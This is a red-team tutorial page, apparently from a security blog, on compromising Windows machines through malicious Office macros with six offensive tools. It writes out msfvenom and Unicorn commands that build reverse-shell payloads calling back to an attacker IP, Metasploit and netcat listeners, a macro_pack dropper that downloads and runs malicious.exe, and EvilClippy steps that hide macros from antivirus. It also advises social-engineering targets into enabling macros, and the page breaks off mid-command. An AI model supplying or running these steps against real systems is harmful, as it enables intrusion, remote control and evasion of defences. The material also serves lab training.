<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Multiple Ways to Exploit Windows Systems using Macros</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/multiple-ways-to-exploit-windows-systems-using-macros/" rel="bookmark"><time class="entry-date published" datetime="2020-02-26T16:33:00+00:00">February 26, 2020</time><time class="updated" datetime="2025-06-02T13:54:07+00:00">June 2, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this article, we will be exploring a total of 6 tools that can craft, encrypt and exploit a Windows Machine using malicious Macros.</span></p>
<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li class="ai-optimize-8"><span style="color: #000000;"><strong>Introduction</strong></span>
<ul>
<li class="ai-optimize-9"><span style="color: #000000;">What are Macros?</span></li>
<li class="ai-optimize-10"><span style="color: #000000;">Why Macros are Dangerous</span></li>
</ul>
</li>
<li class="ai-optimize-11"><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li class="ai-optimize-12"><span style="color: #000000;">Empire</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">Magic Unicorn</span></li>
<li class="ai-optimize-14"><span style="color: #000000;">Metasploit</span></li>
<li class="ai-optimize-15"><span style="color: #000000;">LuckyStrike</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">Macro_Pack</span></li>
<li class="ai-optimize-17"><span style="color: #000000;">Evil Clipper</span></li>
</ul>
</li>
<li class="ai-optimize-18"><span style="color: #000000;"><strong>Mitigations </strong></span></li>
</ul>
<h3 class="ai-optimize-19"><span style="color: #800000;">Introduction</span></h3>
<h4 class="ai-optimize-20"><span style="color: #000000;">What are Macros?</span></h4>
<p class="ai-optimize-21"><span style="color: #000000;">Whenever you are working with an Excel File or Word File for an instance and you want a certain repetitive task that you wish just got automated without your intervention. This was the issue that was faced by the users of the newly built Microsoft Office. Microsoft came to a solution for this by creating what we know as Macros. Macros are quite essentially just Visual Basic Scripts that can be crafted and shared and it works in the background without any knowledge of the user (if enabled.).</span></p>
<h4 class="ai-optimize-22"><span style="color: #000000;">Why Macros are Dangerous?</span></h4>
<p class="ai-optimize-23"><span style="color: #000000;"><strong> </strong>Now that you get what macros mean in a nutshell, it is not that difficult to wrap your head around the fact that running scripts in the background that can be crafted and altered and shared are bound to used as a way to exploit machines. What attacker does is that they generate a very harmless looking file in the Microsoft Office. Then they open up the Macros Editor and then craft a script that could generate a session form the target user to the attacker. The basic flow is the same for almost all tools. But the techniques that each tool uses in the background are quite different than another.</span></p>
<h3 class="ai-optimize-24"><span style="color: #800000;">Exploitation</span></h3>
<p class="ai-optimize-25"><span style="color: #000000;">Now that we have established what are Macros and understood the risks, let’s see how it can affect the real-life scenarios. We have created a Lab Environment with Kali Linux, Windows 10 and other tools. We are going to exploit a Windows System using 5 different tools.</span></p>
<h3 class="ai-optimize-26"><span style="color: #800000;">Empire</span></h3>
<p class="ai-optimize-27"><span style="color: #000000;">To use the Empire on Kali Linux, we need to install Empire Framework on your Attacker Machine. This is a pretty simple process. If you are facing some trouble, then refer to this <a style="color: #000000;" href="https://www.hackingarticles.in/hacking-with-empire-powershell-post-exploitation-agent/">article</a>. After a successful installation, we will fire up the framework. We checked for the active listeners using the “listeners” command. As we can see that no listeners were running. Now, let’s create one. We created an HTTP Listener. After that, we need to create a stager for that listener that we just created. </span></p>
<h4 class="ai-optimize-126"><span style="color: #000000;">Creating a Listener and Stager in Empire</span></h4>
<p class="ai-optimize-27"><span style="color: #000000;">As our demonstration is based on Macros, we will be using the same for the stager. We will link the listener to the stager and just execute the config. This will create a stager in the “/tmp/macro”.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">listeners
uselisteners http
execute
back
usestager windows/macro
set Listener http
execute</pre>
<p class="ai-optimize-28"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WCg_f8iSvRc/XlaWKL_sciI/AAAAAAAAi0U/z0IzQ2MyZ54yi23Ne9VZUVlN-vYP1yIOgCLcBGAsYHQ/s1600/1.png"/></span></p>
<p class="ai-optimize-29"><span style="color: #000000;">Moving on to the Target Machine, as we are doing this demonstration in a Lab Environment, it is easier to execute the following steps. We take a Normal Excel File and enter some data into it. Then we click on the “VIEW” Tab. In this tab, we will be selecting the Macros Option.</span></p>
<p class="ai-optimize-30"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-P3Teo8dnQkk/XlaWNdYJH4I/AAAAAAAAi04/mLfpvJk_CX0TtBGsCJG15ueBcP8JLcERACLcBGAsYHQ/s1600/2.png"/></span></p>
<h4 class="ai-optimize-127"><span style="color: #000000;">Embedding the Empire Macro Payload into Excel</span></h4>
<p class="ai-optimize-31"><span style="color: #000000;">Clicking on the Macros will open up a small window as depicted in the image given below. Here, we are asked for the name of the Macro. This can be anything you want. After entering the name, click on the Create button to get started.</span></p>
<p class="ai-optimize-32"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mGpqXDiTn6g/XlaWREFbFxI/AAAAAAAAi1k/tPcRjHlSscYceDUL_exz0m-6sRs_yxQnACLcBGAsYHQ/s1600/3.png"/></span></p>
<p class="ai-optimize-33"><span style="color: #000000;">Here we have a blank module in which we can draft a Macro. We went back to our Kali Machine and copied the code that was generated by the Empire. Then Pasted the contents of that macro file into this blank module as shown in the image given below.</span></p>
<p class="ai-optimize-34"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WQvCfQH8NEQ/XlaWUQR91EI/AAAAAAAAi2M/rdX5vzilXAMmi8YItbP1xUFarFBE8zjMQCLcBGAsYHQ/s1600/4.png"/></span></p>
<p class="ai-optimize-35"><span style="color: #000000;">After pasting the code, we choose the Save As option from the menu. It opens up a window. In this window, we name the file and We choose Excel Macro-Enabled Workbook as shown in the image given below.  We click the Save button after filling in the necessary details.</span></p>
<p class="ai-optimize-36"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-A4Idmh3ORhU/XlaWUdS_OGI/AAAAAAAAi2Q/s-csW0t6ed8CSZMw-GuO79tQYq1s4iULwCLcBGAsYHQ/s1600/5.png"/></span></p>
<h4 class="ai-optimize-128"><span style="color: #000000;">Adjusting Macro Security Settings and Executing the Payload</span></h4>
<p class="ai-optimize-37"><span style="color: #000000;">Back in earlier days, this was all that is need to do. But seeing the rise in the Macro related attacks in the normal Office Environment, Microsoft has added some more verification on the User End to stop some attacks. Now we open a new Excel Workbook. We choose the “File” tab. In this tab, we Click the Options Section as shown in the image given below.</span></p>
<p class="ai-optimize-38"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xL0Agvbs44c/XlaWVFJKxnI/AAAAAAAAi2U/XfEI9OZs0WA3eqZ8RIENfWqDiZ8oiQT5QCLcBGAsYHQ/s1600/6.png"/></span></p>
<p class="ai-optimize-39"><span style="color: #000000;">Clicking the Options Section will open a small window as shown in the image given below. Now the left-hand side menu of this window, there is a section called Trust Center. We opened it to find some privacy and security related settings. Here, we have a subsection called “Microsoft Excel Trust Center”, we open its settings by clicking the “Trust Center Settings” button</span></p>
<p class="ai-optimize-40"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xgrASXE3Xak/XlaWVIYH6NI/AAAAAAAAi2Y/5Of4wAKyZmY7vJxrIxwtevR185uwJ89LQCLcBGAsYHQ/s1600/7.png"/></span></p>
<p class="ai-optimize-41"><span style="color: #000000;">This opens up another window, Here we have a section called Macro Settings. We click on it. It gives us a total of 4 Macro policies each one against a radio button. We have the “Disable all macros with notification” policy selected by default. We change it to “Enable all macros” policy and close the window.</span></p>
<p class="ai-optimize-42"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nUciie1X1mg/XlaWV82RLGI/AAAAAAAAi2c/zNhyh-QyqDUHDGJ3UYjTh3t20PiMYnjOgCLcBGAsYHQ/s1600/8.png"/></span></p>
<p class="ai-optimize-43"><span style="color: #000000;">Then we open our Workbook that has the malicious macros injected in it. It opens up without any hindrance or warnings or prompts. We went back to our attacker machine and check the Empire to find that one of our agent is active. We used the agents command to take a look. Here we see that we have an agent. We tried to access the agent using the interact command. This was the procedure that needs to be followed if we want to exploit a target using the combination of Empire and Macros.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">agents
interact FPSN1YAW
info</pre>
<p class="ai-optimize-44"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZgqUqWT_Ud4/XlaWWS8VCQI/AAAAAAAAi2g/koxLXakdKPYxfiuygSu9jzRsnV6J5vguACLcBGAsYHQ/s1600/9.png"/></span></p>
<h3 class="ai-optimize-45"><span style="color: #800000;">Magic Unicorn</span></h3>
<p class="ai-optimize-46"><span style="color: #000000;">It’s time to check another tool that could help us compromise the target using the macros. For this practical, we use the Unicorn Tool. For a more detailed guide on the Unicorn tool, check out this <a style="color: #000000;" href="https://www.hackingarticles.in/magic-unicorn-powershell-downgrade-attack-and-exploitation-tool/">awesome guide</a>. The payload creation in the unicorn is quite simple. We will have to state the payload as we would in crafting payload using MSFvenom. Then, we need to provide the IP Address and the port at which the session would generate and provide the macro keyword as depicted below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python unicorn.py windows/meterpreter/reverse_https 192.168.1.106 443 macro</pre>
<p class="ai-optimize-47"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qEO2GO8SrIU/XlaWJ5sDd2I/AAAAAAAAi0M/6BwVQx0UWQEiKzjS_qWHTXzWVb_zS0B9ACLcBGAsYHQ/s1600/10.png"/></span></p>
<p class="ai-optimize-48"><span style="color: #000000;">This creates a text file and a “.rc” file with the same name and on the same destination.</span></p>
<p class="ai-optimize-49"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pIPX0SlFNQA/XlaWKEWdbPI/AAAAAAAAi0Q/HFl7yQUe1fE17bsimLecD3Zp2MgOYC-wACLcBGAsYHQ/s1600/11.png"/></span></p>
<p class="ai-optimize-50"><span style="color: #000000;">We run the command shown by the unicorn to create a listener for our payload.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -r unicorn.rc</pre>
<p class="ai-optimize-51"><span style="color: #000000;">Now we need the macros enabled in Excel to accomplish this attack. In our lab environment, we enabled the macros in the previous practical when we were trying to exploit the target using Empire. So, After that, we open an Excel file and follow the steps to create a macro. After opening the macros editor module, we paste the data that was inside the text file that was created by Unicorn and then saves the Excel workbook as the Macros Enabled Excel on the Target System.</span></p>
<p class="ai-optimize-52"><span style="color: #000000;">After saving the Malicious macros enabled Excel, we open the Excel on the Target System. It gives a Compatibility Error as shown in the image given below.</span></p>
<p class="ai-optimize-53"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XCHPcj1wlMk/XlaWLH01vwI/AAAAAAAAi0Y/AoAl9864nfcBU1qY1kSrKh6TeRni5FQXwCLcBGAsYHQ/s1600/12.png"/></span></p>
<p class="ai-optimize-54"><span style="color: #000000;">But when we move back to our attacker machine, we see that our payload has generated a meterpreter shell on the Target Machine. We can access this meterpreter session using the sessions command followed by the session id as shown in the image given below.</span></p>
<p class="ai-optimize-55"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aTFQlFxT2wo/XlaWLUN1JqI/AAAAAAAAi0c/XJsCjFilxVM12Moze_P34WAJX0wV9LlrACLcBGAsYHQ/s1600/13.png"/></span></p>
<h3 class="ai-optimize-56"><span style="color: #800000;">Metasploit</span></h3>
<p class="ai-optimize-57"><span style="color: #000000;">Let’s move on to a rather basic approach. This approach is quite detectable by almost all the Antivirus tools as the signature of the Metasploit Payload is quite common. Still to understand the basic attack and to perform in a lab environment, we will be using Metasploit for exploiting our target via Marcos.  </span></p>
<p class="ai-optimize-58"><span style="color: #000000;">We must create a payload before we can begin. The payload will be crafted using MSFvenom. For this example, we utilized the reverse_http payload. We provided the attacker’s machine’s local IP address, which is Kali Linux. Additionally, we must supply a local port on which the session will be generated. Following the creation of the payload with the appropriate vba payload configuration, we replicate the content of the vba payload before proceeding to the target computer.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_https lhost=192.168.1.106 lport=1234 -f vba</pre>
<p class="ai-optimize-59"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Bvj9pu-nQNc/XlaWL5TtVvI/AAAAAAAAi0g/eUfbBfrkfbAXr9v2GAuTx1F_P4wfytIrACLcBGAsYHQ/s1600/14.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost 192.168.1.106
set lport 1234
exploit</pre>
<p class="ai-optimize-60"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HTJ4hr1qLrQ/XlaWMEqDDkI/AAAAAAAAi0k/g-eA0Jxu1hMYZrQzA_RRQHTa9TVxWjSxwCLcBGAsYHQ/s1600/15.png"/></span></p>
<h3 class="ai-optimize-61"><span style="color: #800000;">LuckyStrike</span></h3>
<p class="ai-optimize-62"><span style="color: #000000;">Let’s move on to the next tool in our arsenal, Lucky Strike. It uses the “Invoke-Obfuscation” tool to obfuscate the payloads. So we downloaded it as well as LuckyStrike form GitHub.</span></p>
<p class="ai-optimize-63"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EhkPMbCFkH4/XlaWMgCe1yI/AAAAAAAAi0o/4BUbIzLpH1Qz4t9Iyke0W-u72cfvIQsZACLcBGAsYHQ/s1600/16.png"/></span></p>
<h4 class="ai-optimize-123"><span style="color: #000000;">Configuring and Installing LuckyStrike</span></h4>
<p class="ai-optimize-64"><span style="color: #000000;">To enable Invoke Obfuscation to work and allow LuckyStrike to access it, we need to move the Invoke Obfuscation tool to the PowerShell Modules directory as shown in the image given below.</span></p>
<p class="ai-optimize-65"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZyPG4IRu4dY/XlaWMkap7dI/AAAAAAAAi0s/fdkPiZqZWr4pdwIdUr5YJVJPb2Q044nfgCLcBGAsYHQ/s1600/17.png"/></span></p>
<p class="ai-optimize-66"><span style="color: #000000;">Now that we have completed the initial configuration of LuckyStrike, we need to move on to the Installation Phase. By default, Windows 10 enforces a policy called Execution Policy that restricts the user from running scripts on the system. We need to alter that policy to run LuckyStrike. After making changes to the Execution Policy, we moved to the LuckyStrike directory. Here, we see that we have an install.ps1 script. We run the script. We are asked a bunch of Confirmations; we state Yes to all. After running the install script, we have the LuckyStrike in the System.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd C:\Users\raj\Desktop\luckystrike-master
Set-ExecutionPolicy Unrestricted
ls
.\install.ps1</pre>
<p class="ai-optimize-67"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7x0u-I2iGnM/XlaWNGPW1zI/AAAAAAAAi0w/kxB1cZXi2VMrLfUqUEZKn3UfkMsT7imAACLcBGAsYHQ/s1600/18.png"/></span></p>
<h4 class="ai-optimize-124"><span style="color: #000000;">Adding and Obfuscating Payload with LuckyStrike</span></h4>
<p class="ai-optimize-68"><span style="color: #000000;">Then, before firing up our LuckyStrike, we need to have a payload that will generate the session. We used a one-line PowerShell script for the same. Save this file with the ps1 extension and then we will move on to obfuscate it using LuckyStrike.</span></p>
<p class="ai-optimize-69"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rDY47BwY0go/XlaWNZGlv_I/AAAAAAAAi00/Oq4ACQEMVaUvyK1TJwI3uYGlj69AzG5tACLcBGAsYHQ/s1600/19.png"/></span></p>
<p class="ai-optimize-70"><span style="color: #000000;">Now that we have our payload, let’s run the LuckyStrike. As soon as we run the LuckyStrike, we have a beautiful banner and the Main Menu. In this menu we have multiple options like Payload, Catalog, File, etc., We choose the Catalog Options by entering the number 2. This gave us a sub-menu titled, “Catalog Options”. Here we have the configurations that can be done on the Payload and Templates. Before moving any further we need to add the payload that we just created in the LuckyStrike Catalog. Do this by entering number 1.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd .\luckystrike\
.\luckystrike.ps1</pre>
<p class="ai-optimize-71"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4yRMGJ-zkuM/XlaWN0yklKI/AAAAAAAAi08/SWiZ9uys_WIsBiTWACCAuR5vipIJKWU-ACLcBGAsYHQ/s1600/20.png"/></span></p>
<p class="ai-optimize-72"><span style="color: #000000;">After the Selection of the payload, we were asked for the title for the payload. Then it asks us for the Target IP address and Port. These are optional parameters hence we skipped them by hitting enter. In the description, we state “netcat” for our reference. Next, we need to choose the payload type. Now we need to choose the payload type. As we created a PowerShell Script for the payload, we chose the same. Then LuckyStrike asks us for the path of the payload file. After doing it due diligence LuckyStrike adds the payload in its Catalog.  </span></p>
<p class="ai-optimize-73"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-g4Izh9Nbo4I/XlaWOBIDLCI/AAAAAAAAi1A/8NtO6ABJ45wSYoR6UrzjCa5kVc0S2M12QCLcBGAsYHQ/s1600/21.png"/></span></p>
<h4 class="ai-optimize-125"><span style="color: #000000;">Generating the Infected File and Exploiting the Target</span></h4>
<p class="ai-optimize-74"><span style="color: #000000;">Then, in order to move ahead, we need to navigate to the Main Menu, which can be achieved by entering the number 99. Once in the Main Menu, we proceed by selecting the Payload Options using number 1. Consequently, this opens a submenu of Payload Options. Within this menu, we select the payload by choosing number 1. After entering the ‘Select the Payload’ option, we are prompted to specify the type of file we want as an output. </span></p>
<p class="ai-optimize-74"><span style="color: #000000;">At this point, we choose the Excel File format. As a result, we are presented with a list of added payloads—here, we can see the revshell payload that was added earlier. After selecting the payload, we are then prompted to choose the type of Infection, which determines the method LuckyStrike will use for Obfuscation. For this scenario, we opt for the nonB64 method; however, you may choose any method depending on your specific requirements.</span></p>
<p class="ai-optimize-75"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6qEoy5HUH2U/XlaWOf_SBAI/AAAAAAAAi1E/NHgy5iaNJo4bleQkVNYthG3tdP8YCT7dgCLcBGAsYHQ/s1600/22.png"/></span></p>
<p class="ai-optimize-76"><span style="color: #000000;">Now that the payload is added. Then we get back to the Main Menu to generate the final malicious Excel File. Additionally, in the Main Menu, we chose the File options by entering number 3. In the File Options menu, we choose the Generate a new file option by entering number 1. This will initiate the process of creating an Excel with malicious payload inside its macro. After creating the payload, LuckyStrike gives us the location of the payload.</span></p>
<p class="ai-optimize-77"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ssca_JckrpM/XlaWO46vasI/AAAAAAAAi1I/vgOMSQ5jQ-Aa36eUJHxvu0Lv8jLiV0I4gCLcBGAsYHQ/s1600/23.png"/></span></p>
<p class="ai-optimize-78"><span style="color: #000000;">We open the given location inside the Windows Explorer to find an Excel file by the name infected. Then, we need to share this file with Target and encourage him/her to open the file and enable the macros.</span></p>
<p class="ai-optimize-79"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xvTgaI6zPH8/XlaWPZO0O0I/AAAAAAAAi1M/CUcEXpD3YmckVWc8TxFDG4aenYjN8uycACLcBGAsYHQ/s1600/24.png"/></span></p>
<p class="ai-optimize-80"><span style="color: #000000;">We will do this while on the Kali Machine, we run the listener with the port that we mentioned in the payload during its creation. Then, as soon as the target enables the macros on the Excel File we will have its PowerShell Session as shown in the image given below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234</pre>
<p class="ai-optimize-81"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wci5l2X1jeA/XlaWPvgBotI/AAAAAAAAi1Q/2mHAyHnhtKoU_yeu9puYFeDhAoaO3vVCACLcBGAsYHQ/s1600/25.png"/></span></p>
<h3 class="ai-optimize-82"><span style="color: #800000;">Macro_Pack</span></h3>
<p class="ai-optimize-83"><span style="color: #000000;">The next tool on our list is the Macro_Pack. The working of this tool is quite similar to the working of the LuckyStrike. Firstly, we need a payload in which we generate the session. For this, we will be using the MSFVenom tool. In our Kali Machine, we ran the MSFVenom tool and crafted a payload as shown in the image given below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.152.131 lport=6666 -f exe &gt;&gt; malicious.exe</pre>
<p class="ai-optimize-84"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-F0oAgQ4w8oE/XlaWPzMieGI/AAAAAAAAi1U/Fj_X1muh1mYXZkc9jub-wfdb1Lu-mmCPQCLcBGAsYHQ/s1600/26.png"/></span></p>
<p class="ai-optimize-85"><span style="color: #000000;">After the creation of payload, we will run a Python one-liner and host the payload on the local port 80.</span></p>
<p class="ai-optimize-86"><span style="color: #000000;">After this, we will move to our Windows Machine; here we will download the tool and then use the macro_pack to create an Excel file that embeds the malicious payload. You can achieve this using the one-liner mentioned below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "http://192.168.152.131/malicious.exe" "dropped.exe" | .\macro_pack.exe -o -t DROPPER -G "drop.xlsm"</pre>
<p class="ai-optimize-87"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jC2bxsQUGBQ/XlaWQPJPY_I/AAAAAAAAi1Y/VbQVaZfgHYEoczjjaZEoSV4WgzusKOPjACLcBGAsYHQ/s1600/27.png"/></span></p>
<p class="ai-optimize-88"><span style="color: #000000;">We went to the location, where the Macro_packer created the payload and then use some of our social engineering skills to transfer the payload to the Target Victim.</span></p>
<p class="ai-optimize-89"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RSuqsHAhsh4/XlaWQlkiaCI/AAAAAAAAi1c/3s7p7MafkGofhRtJ9aZBqGst6hcSESygQCLcBGAsYHQ/s1600/28.png"/></span></p>
<p class="ai-optimize-90"><span style="color: #000000;">We sent the payload to the Target and then opened the Excel Workbook. To find the Security Warning as shown in the image given below. Before doing any of this, make sure that you have the listener running to capture the session generated by the payload. As everything set, as soon as the target user clicks on the Enable Content, we have the meterpreter session of the user.</span></p>
<p class="ai-optimize-91"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XbbvkCL73LA/XlaWQ1iSPHI/AAAAAAAAi1g/eTlN-ay9b545FiDqVuvvI2Aa0mfQ-cYRQCLcBGAsYHQ/s1600/29.png"/></span></p>
<p class="ai-optimize-92"><span style="color: #000000;">We set up the listener for the same payload that we used while generating using the MSFVenom tool. We also provide the Local IP Address of our Kali Machine and the port that we mentioned during crafting the payload.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.152.131
set lport 6666
run</pre>
<p class="ai-optimize-93"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XqtU-EA185E/XlaWRstdelI/AAAAAAAAi1o/EIyBmHPc0tUVOga5iDN9Pc-jwELz_DLdACLcBGAsYHQ/s1600/30.png"/></span></p>
<h3 class="ai-optimize-94"><span style="color: #800000;">Evil Clipper</span></h3>
<p class="ai-optimize-95"><span style="color: #000000;">If you were a Windows XP user with the old version of Microsoft Office, there is a chance you must have come across the animated clip mascot that Microsoft used at that time. This tool is a remembrance to that tool, what would happen if that clipper went Evil and hid the macros details. How? Let’s find out.</span></p>
<h4 class="ai-optimize-120" data-start="150" data-end="199"><span style="color: #000000;">Generating the Malicious Macro Payload</span></h4>
<p class="ai-optimize-96"><span style="color: #000000;">As always we need to craft a payload that could give back a reverse HTTPS session. Additionally, we provide the Local IP Address of the Kali Machine as well as the port that will capture the session generated by the said payload. We generate this payload in the VBA format. After the generation of the payload, we copy the contents of the payload on our clipboard and move on to our Windows Machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_https lhost=192.168.152.131 lport=1234 -f vba</pre>
<p class="ai-optimize-97"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oPUVRHAHUYs/XlaWRknySpI/AAAAAAAAi1s/yi_fv592neYN01gEWVGcuIx32c4pdvWzwCLcBGAsYHQ/s1600/31.png"/></span></p>
<p class="ai-optimize-98"><span style="color: #000000;">Here, we used the git clone command to clone the Evil Clippy tool to our Windows Machine. For this particular step, we need to install git on Windows. Also, add git to PATH Variable as well.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/outflanknl/EvilClippy.git</pre>
<p class="ai-optimize-99"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PbDRsAoZcz0/XlaWR2fCxiI/AAAAAAAAi1w/79p1k8dAhokYSaOhPr7qpZaVzI3GNA4zQCLcBGAsYHQ/s1600/32.png"/></span></p>
<p class="ai-optimize-100"><span style="color: #000000;">After cloning the EvilClippy git and look for the files. In these files, we see that we don’t have an executable. Then, we will build an executable using the csc from the Visual Studio C# Compiler. After the building, we see that we have an executable inside the same directory. We try to run the executable as shown in the image given below.   </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs
.\EvilClippy.exe -h</pre>
<p class="ai-optimize-101"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UeB1AC2cHlo/XlaWSd1U7iI/AAAAAAAAi10/kJtoTA0n-X48ZdAgzoCLMnXuwCqtH3fmwCLcBGAsYHQ/s1600/33.png"/></span></p>
<h4 class="ai-optimize-121"><span style="color: #000000;">Creating and Hiding the Malicious Macro</span></h4>
<p class="ai-optimize-102"><span style="color: #000000;">Then, we open an Excel Workbook. And then create macros as we did earlier in this article. In the image given below, we name our macro “malicious” and click on the create button.</span></p>
<p class="ai-optimize-103"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6jfMi7TV2z8/XlaWSjH0m5I/AAAAAAAAi14/tlKfrleV-04mW_k0B8KM0Dq1HI1cxI5VACLcBGAsYHQ/s320/34.png"/></span></p>
<p class="ai-optimize-104"><span style="color: #000000;">As soon as we click on the create button, we have Microsoft Visual Basic for Applications to draft the macros. There, we paste the payload code in VBS that we created at the beginning of the practical.</span></p>
<p class="ai-optimize-105"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8Lbe7CbTFFA/XlaWTS3T1eI/AAAAAAAAi18/270TNrxtcxUFIvC0c9hl1wva5hnf2alQgCLcBGAsYHQ/s1600/35.png"/></span></p>
<p class="ai-optimize-106"><span style="color: #000000;">Then, we need to save this malicious macro-enabled Excel in the xlsm format in the same directory as the EvilClippy with all its configuration files. Now we will use the EvilClippt to hide the modules in the malicious macro that could trigger any Antivirus alert or any manual inspection by the user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls
.\EvilClippy.exe -g malicious.xlsm</pre>
<p class="ai-optimize-107"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XngOEVj70SU/XlaWTeb0VFI/AAAAAAAAi2A/cFt7sejpYtwfnd-PvCbWgn9Q1P6l9YgrACLcBGAsYHQ/s1600/36.png"/></span></p>
<h4 class="ai-optimize-122"><span style="color: #000000;">Executing the Payload and Establishing a Session</span></h4>
<p class="ai-optimize-108"><span style="color: #000000;">After the EvilClippy worked with the malicious Excel, we went back to open the file to check if Excel itself really removed the modules.</span></p>
<p class="ai-optimize-109"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ggaPyKYV7YM/XlaWTlDsUrI/AAAAAAAAi2E/Z9EHzlidpFsMDFyUGzIaOXuWSQhJ4C88gCLcBGAsYHQ/s1600/37.png"/></span></p>
<p class="ai-optimize-110"><span style="color: #000000;">The above screenshot shows that no one can find the malicious macros anywhere in the Macro Editor of the Excel File. This doesn’t mean that the file deleted the macro. All EvilClippy did was hide the macro inside the Excel File, and when someone executes the macro and we create a listener that has the same configurations as the payload. We can gain a meterpreter session as shown in the image given below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use multi/handler
set payload windows/meterpreter/reverse_https
